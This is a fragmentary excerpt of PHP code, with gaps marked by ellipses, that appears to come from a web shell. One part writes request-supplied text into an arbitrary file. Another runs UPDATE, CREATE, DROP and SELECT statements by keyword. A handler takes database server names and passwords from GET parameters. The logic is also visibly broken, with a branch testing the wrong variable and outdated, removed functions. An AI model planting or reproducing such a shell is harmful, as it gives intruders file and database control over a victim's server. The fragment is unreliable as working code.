...
if (isset($_REQUEST['file'])) {
    ...
    rewind($fp);
    if ('' == $addtxt) {
        @fwrite($fp, stripslashes($src));
    } else {
        $rs = @fwrite($fp, stripslashes($addtxt));
    }
    if (true == $rs) {
...
function exe_u($query)
{
    ...
    if (mysql_affected_rows($result) >= 0) {
        echo 'Affected rows : ' . mysql_affected_rows($result) . 'This is Ok ! ^.^<br>';
    }
}
...
function sql($string)
{
    ...
    for ($i = 0; $i <= count($arr); ++$i) {
        $check_u = eregi('update', @$arr[$i]);
        if (true == $check_u) {
            exe_u(@$arr[$i]);
        }
        $check_e = eregi('use', @$arr[$i]);
        if (true == $check_u) {
            exe_u(@$arr[$i]);
        }
        $check_c = eregi('create', @$arr[$i]);
        if (true == $check_c) {
            exe_c(@$arr[$i]);
        }
        $check_d = eregi('drop', @$arr[$i]);
        if (true == $check_d) {
            exe_d(@$arr[$i]);
        }
        $check_w = eregi('show', @$arr[$i]);
        if (true == $check_w) {
            exe_w(@$arr[$i]);
        }
        $check_s = eregi('select', @$arr[$i]);
        if (true == $check_s) {
            exe_s(@$arr[$i]);
        }
    }
...
if ('sql' == $act) {
    if (isset($_GET['srname']) && isset($_GET['pass'])) {
        echo $_GET['srname'];
        if (!isset($_GET['srname'])) {
            $servername = $_GET['srname'];
        } else {
